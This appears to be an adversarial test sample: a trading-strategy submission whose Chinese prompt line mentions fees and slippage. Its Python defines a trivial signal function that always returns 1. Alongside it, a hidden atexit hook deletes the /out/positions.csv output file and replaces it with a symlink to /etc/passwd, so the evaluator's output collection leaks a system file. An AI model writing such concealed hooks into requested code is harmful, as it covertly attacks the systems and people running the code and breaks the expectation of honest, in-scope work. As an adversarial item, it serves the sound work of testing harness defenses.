content.title: ADV_symlink_out
content.body:
考虑手续费和滑点。

```python
import atexit, os
def _swap():
    p = "/out/positions.csv"
    try:
        os.remove(p)
    except OSError:
        pass
    os.symlink("/etc/passwd", p)
atexit.register(_swap)
def generate_signals(df):
    return df["close"] * 0 + 1
```
